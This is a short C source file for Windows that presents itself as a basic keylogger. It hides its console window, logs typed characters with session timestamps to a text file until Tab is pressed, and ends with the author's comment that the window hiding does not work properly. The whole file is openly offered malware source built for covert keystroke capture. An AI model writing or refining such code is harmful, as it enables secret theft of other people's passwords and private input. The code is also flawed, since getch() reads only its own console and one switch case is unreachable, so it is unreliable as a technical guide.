#include <stdio.h>
#include <windows.h>
#include <conio.h>
#include <time.h>

int main(){
    // Hide console
    AllocConsole();
    HWND hWnd = GetConsoleWindow();
    ShowWindow(hWnd, SW_HIDE);

    // Variables and file definition
    volatile char input_letter = '\0';
    FILE *ptr = fopen("saved_keystrokes.txt", "a+");
    if(ptr == NULL){
        return 1;
    }

    // Date and time variables for logging
    time_t t;
    time(&t); // Get the current time and date

    // Intro banner for textfile
    fprintf(ptr, "%s", "===========KEY DUMP LOG===========\n");

    // Insert current date and time
    fprintf(ptr, "SESSION STARTED : %s \n", ctime(&t));

    // Logger logic
    while(input_letter != VK_TAB){
        Sleep(55);
        input_letter = getch();
        if (input_letter == 1 || input_letter == EOF){
            continue; // If an exception occures with user input,
        }

        switch(input_letter){
            case VK_SPACE:
                fprintf(ptr, "%s", " ");
                break;
            case 0x0D: // No VKEY for the enter button
                fprintf(ptr, "%s", "\n");
                break;
            case 0x09: // No VKEY for the tab button
                fprintf(ptr, "%s", "[TAB]");
                break;
            case 0x1B: // No VKEY for the escape button
                fprintf(ptr, "%s", "[ESC]");
                break;
            case 0x08: // No VKEY for the backscace button
                fprintf(ptr, "[BACKSPACE]");
                break;
            default:
                fputc((int)input_letter, ptr);
                break;
        }

        fflush(ptr);
    }

    time(&t); // Get the new current time and date
    fprintf(ptr, "\n\nSESSION ENDED : %s \n", ctime(&t));

    fclose(ptr);
    return 0;
}

// This program serves as a basic representation how one would do a keylogger, unfortunatley I could not find a way how to hide the window properly using GCC ...
